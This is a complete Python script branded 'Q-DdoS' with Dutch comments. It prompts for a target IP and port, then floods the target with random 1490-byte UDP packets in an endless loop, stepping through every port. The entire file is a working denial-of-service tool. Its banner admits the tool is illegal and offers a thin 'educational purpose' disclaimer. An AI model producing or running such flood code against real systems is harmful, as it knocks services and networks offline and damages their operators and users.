import sys
import os
import socket
import random
from datetime import datetime

# Huidige tijd en datum
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Socket instellen
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Scherm schoonmaken en informatie weergeven
os.system("clear")
os.system("figlet Q-DdoS")
print("Coded By : nnoa")
print("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk, We'll Be Not Responsible For Kind Of Problems")
print()

# Doel-IP en poort invoeren
ip = input("IP Target : ")
port = int(input("Port       : "))
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print("Team : nnoa")
print("\033[92m")

# Verzendpakketten
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print("Sent %s packet to %s through port: %s" % (sent, ip, port))
    if port == 65534:
        port = 1
